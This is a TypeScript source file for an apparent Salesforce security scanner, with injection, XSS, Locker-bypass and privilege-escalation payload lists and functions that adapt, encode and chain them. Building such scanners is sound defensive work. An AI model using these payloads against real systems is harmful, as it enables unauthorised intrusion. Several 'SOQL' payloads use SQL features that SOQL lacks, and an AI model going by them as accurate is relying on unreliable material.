import { PayloadTemplate, DASTTestCategory, Parameter } from '../../types/dast';

export class PayloadGenerator {
  private payloadTemplates: Map<DASTTestCategory, PayloadTemplate[]> = new Map();
  private salesforceSpecificPayloads: PayloadTemplate[] = [];

  constructor() {
    this.initializePayloadTemplates();
  }

  private initializePayloadTemplates(): void {
    // SOQL Injection Payloads
    this.payloadTemplates.set('soql_injection', [
      {
        id: 'soql-1',
        category: 'soql_injection',
        name: 'Basic SOQL Injection',
        description: 'Tests for basic SOQL injection vulnerability',
        payload: "' OR 1=1--",
        variations: [
          "' OR '1'='1",
          "' OR 1=1 LIMIT 1--",
          "' UNION SELECT Id FROM User--",
          "'; SELECT Id FROM User--"
        ],
        context: 'body',
        encoding: 'none',
        salesforceSpecific: true
      },
      {
        id: 'soql-2',
        category: 'soql_injection',
        name: 'SOQL Blind Injection',
        description: 'Tests for blind SOQL injection using time delays',
        payload: "' AND (SELECT COUNT() FROM User) > 0--",
        variations: [
          "' AND (SELECT COUNT() FROM Account) > 1000--",
          "' AND Id IN (SELECT Id FROM User LIMIT 1)--"
        ],
        context: 'body',
        encoding: 'none',
        salesforceSpecific: true
      },
      {
        id: 'soql-3',
        category: 'soql_injection',
        name: 'SOQL Error-Based Injection',
        description: 'Triggers SOQL errors to extract information',
        payload: "' AND CONVERT(int, (SELECT TOP 1 Name FROM Account))--",
        variations: [
          "' AND 1=CONVERT(int, (SELECT Name FROM User LIMIT 1))--",
          "' AND 1=(SELECT COUNT(*) FROM InvalidObject)--"
        ],
        context: 'body',
        encoding: 'none',
        salesforceSpecific: true
      }
    ]);

    // XSS Payloads for Lightning/Visualforce
    this.payloadTemplates.set('xss_testing', [
      {
        id: 'xss-1',
        category: 'xss_testing',
        name: 'Lightning Component XSS',
        description: 'XSS payload for Lightning components',
        payload: '<script>alert("XSS")</script>',
        variations: [
          '<img src=x onerror=alert("XSS")>',
          '<svg onload=alert("XSS")>',
          'javascript:alert("XSS")',
          '<iframe src="javascript:alert(\'XSS\')"></iframe>'
        ],
        context: 'body',
        encoding: 'none',
        salesforceSpecific: true
      },
      {
        id: 'xss-2',
        category: 'xss_testing',
        name: 'Visualforce Expression XSS',
        description: 'XSS through Visualforce expression language',
        payload: '{!$Request.param}',
        variations: [
          '{!HTMLENCODE($Request.param)}',
          '{!JSENCODE($Request.param)}',
          '{!URLENCODE($Request.param)}'
        ],
        context: 'url',
        encoding: 'none',
        salesforceSpecific: true
      },
      {
        id: 'xss-3',
        category: 'xss_testing',
        name: 'Lightning Locker Bypass',
        description: 'Attempts to bypass Lightning Locker Service',
        payload: 'constructor.constructor("alert(1)")()',
        variations: [
          'top.constructor.constructor("alert(1)")()',
          'window["constructor"]["constructor"]("alert(1)")()',
          'Function("alert(1)")()'
        ],
        context: 'body',
        encoding: 'none',
        salesforceSpecific: true
      }
    ]);

    // Authentication Bypass Payloads
    this.payloadTemplates.set('auth_bypass', [
      {
        id: 'auth-1',
        category: 'auth_bypass',
        name: 'Session Token Manipulation',
        description: 'Tests session token manipulation',
        payload: 'admin',
        variations: [
          'administrator',
          'root',
          'system',
          '00000000000000000'
        ],
        context: 'cookie',
        encoding: 'none',
        salesforceSpecific: true
      },
      {
        id: 'auth-2',
        category: 'auth_bypass',
        name: 'Profile Escalation',
        description: 'Attempts to escalate user profile',
        payload: 'System Administrator',
        variations: [
          'System Admin',
          'Admin',
          'Super User'
        ],
        context: 'body',
        encoding: 'none',
        salesforceSpecific: true
      }
    ]);

    // Lightning Security Bypass
    this.payloadTemplates.set('lightning_security', [
      {
        id: 'lightning-1',
        category: 'lightning_security',
        name: 'Lightning Data Service Bypass',
        description: 'Tests Lightning Data Service security',
        payload: '{"recordId":"003000000000000","fields":["Name","Email"]}',
        variations: [
          '{"recordId":"005000000000000","fields":["Username","Email"]}',
          '{"recordId":"*","fields":["*"]}'
        ],
        context: 'body',
        encoding: 'none',
        salesforceSpecific: true
      }
    ]);

    // Business Logic Testing
    this.payloadTemplates.set('business_logic', [
      {
        id: 'workflow-1',
        category: 'business_logic',
        name: 'Workflow Rule Bypass',
        description: 'Attempts to bypass workflow rules',
        payload: '{"bypassWorkflow": true}',
        variations: [
          '{"skipValidation": true}',
          '{"systemMode": true}'
        ],
        context: 'body',
        encoding: 'none',
        salesforceSpecific: true
      }
    ]);
  }

  generatePayloads(category: DASTTestCategory, parameter: Parameter, context?: any): string[] {
    const templates = this.payloadTemplates.get(category) || [];
    const payloads: string[] = [];

    for (const template of templates) {
      // Generate base payload
      payloads.push(this.customizePayload(template.payload, parameter, context));

      // Generate variations
      for (const variation of template.variations) {
        payloads.push(this.customizePayload(variation, parameter, context));
      }

      // Generate encoded versions
      if (template.encoding !== 'none') {
        const encodedPayload = this.encodePayload(template.payload, template.encoding);
        payloads.push(this.customizePayload(encodedPayload, parameter, context));
      }
    }

    // Add context-specific payloads
    payloads.push(...this.generateContextSpecificPayloads(category, parameter, context));

    return payloads;
  }

  private customizePayload(payload: string, parameter: Parameter, context?: any): string {
    let customizedPayload = payload;

    // Customize based on parameter type
    switch (parameter.dataType) {
      case 'number':
        customizedPayload = this.adaptPayloadForNumber(payload);
        break;
      case 'boolean':
        customizedPayload = this.adaptPayloadForBoolean(payload);
        break;
      case 'object':
        customizedPayload = this.adaptPayloadForObject(payload);
        break;
    }

    // Customize based on Salesforce context
    if (context?.pageType === 'lightning') {
      customizedPayload = this.adaptPayloadForLightning(customizedPayload);
    } else if (context?.pageType === 'visualforce') {
      customizedPayload = this.adaptPayloadForVisualforce(customizedPayload);
    }

    return customizedPayload;
  }

  private generateContextSpecificPayloads(category: DASTTestCategory, parameter: Parameter, context?: any): string[] {
    const payloads: string[] = [];

    if (category === 'soql_injection') {
      // Generate SOQL payloads based on parameter name
      if (parameter.name.toLowerCase().includes('id')) {
        payloads.push("' OR Id LIKE '%'--");
        payloads.push("' OR Id IN (SELECT Id FROM User)--");
      }
      
      if (parameter.name.toLowerCase().includes('name')) {
        payloads.push("' OR Name LIKE '%admin%'--");
        payloads.push("' OR Name = (SELECT Name FROM User LIMIT 1)--");
      }
    }

    if (category === 'xss_testing' && context?.pageType === 'lightning') {
      // Lightning-specific XSS payloads
      payloads.push('$A.get("e.force:showToast").setParams({message:"XSS"}).fire()');
      payloads.push('component.find("inputField").set("v.value", "<script>alert(1)</script>")');
    }

    return payloads;
  }

  private adaptPayloadForNumber(payload: string): string {
    // Convert string payloads to work with numeric parameters
    if (payload.includes("'")) {
      return payload.replace(/'/g, '');
    }
    return payload;
  }

  private adaptPayloadForBoolean(payload: string): string {
    // Convert payloads for boolean parameters
    return payload.toLowerCase().includes('true') ? 'false' : 'true';
  }

  private adaptPayloadForObject(payload: string): string {
    // Ensure payload is valid JSON for object parameters
    try {
      JSON.parse(payload);
      return payload;
    } catch {
      return `{"malicious": "${payload}"}`;
    }
  }

  private adaptPayloadForLightning(payload: string): string {
    // Adapt payload for Lightning components
    if (payload.includes('<script>')) {
      // Lightning Locker Service blocks script tags, use alternatives
      return payload.replace('<script>', '<img src=x onerror=').replace('</script>', '>');
    }
    return payload;
  }

  private adaptPayloadForVisualforce(payload: string): string {
    // Adapt payload for Visualforce pages
    if (payload.includes('{!')) {
      return payload; // Already Visualforce expression
    }
    return `{!${payload}}`;
  }

  private encodePayload(payload: string, encoding: string): string {
    switch (encoding) {
      case 'url':
        return encodeURIComponent(payload);
      case 'html':
        return payload.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
      case 'base64':
        return btoa(payload);
      case 'unicode':
        return payload.split('').map(char => `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}`).join('');
      default:
        return payload;
    }
  }

  // Advanced payload generation methods
  generateTimeBasedPayloads(category: DASTTestCategory): string[] {
    const payloads: string[] = [];

    if (category === 'soql_injection') {
      // Time-based SOQL injection payloads
      payloads.push("' AND (SELECT COUNT() FROM User) > 0 AND SLEEP(5)--");
      payloads.push("' AND IF((SELECT COUNT() FROM Account) > 1000, SLEEP(5), 0)--");
    }

    return payloads;
  }

  generateBlindPayloads(category: DASTTestCategory): string[] {
    const payloads: string[] = [];

    if (category === 'soql_injection') {
      // Blind SOQL injection payloads
      payloads.push("' AND (SELECT SUBSTRING(Name,1,1) FROM User LIMIT 1) = 'A'--");
      payloads.push("' AND (SELECT COUNT() FROM User WHERE Name LIKE 'Admin%') > 0--");
    }

    return payloads;
  }

  generateChainedPayloads(categories: DASTTestCategory[]): string[] {
    const payloads: string[] = [];

    // Generate payloads that combine multiple attack vectors
    if (categories.includes('soql_injection') && categories.includes('xss_testing')) {
      payloads.push("' UNION SELECT '<script>alert(1)</script>' FROM User--");
    }

    return payloads;
  }
}